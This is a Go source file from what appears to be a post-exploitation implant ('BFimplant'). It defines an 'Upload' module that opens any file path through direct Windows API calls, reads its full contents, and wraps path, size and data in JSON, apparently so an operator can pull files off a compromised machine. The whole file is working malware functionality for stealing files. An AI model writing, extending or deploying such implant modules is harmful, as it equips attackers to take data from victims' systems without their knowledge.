package modules

import (
	"encoding/json"
	"fmt"
	"BFimplant/winapiV2"
	"syscall"

)

type UploadModule struct{}

func NewUploadModule() *UploadModule {
	return &UploadModule{}
}

func (m *UploadModule) Name() string {
	return "Upload"
}

func (m *UploadModule) Execute(filePath string,data []byte) (string, error) {

	// open a file handel
	fileHandle, err := winapiV2.CreateFile(syscall.StringToUTF16Ptr(filePath), winapiV2.GENERIC_READ, 0, nil, winapiV2.OPEN_EXISTING, winapiV2.FILE_ATTRIBUTE_NORMAL, 0)
	if err != nil {
		fmt.Println("Error creating a handel to the file:", err)
		return "", err
	}

	//get file size
	fileSize, _ := winapiV2.GetFileSize(fileHandle, nil)

	// read the file
	b := make([]byte, int(fileSize))
	var bread uint32

	succ, err := winapiV2.ReadFile(fileHandle, &b[0] ,uint32(len(b)), &bread, nil)
	
	if err != nil {
		fmt.Println("Error reading file:", err)
		return "", err
	}
	if !succ {
		fmt.Println("Error reading file:", err )
		return "", err
	}

	osInfo := map[string]interface{}{
		"file_path": filePath,
		"file_size": bread,
		"file_data": b,
	}
	file_data, err := json.Marshal(osInfo)
	if err != nil {
		fmt.Println("Error marshaling JSON:", err)
		return "", err
	}

	return string(file_data), nil
}
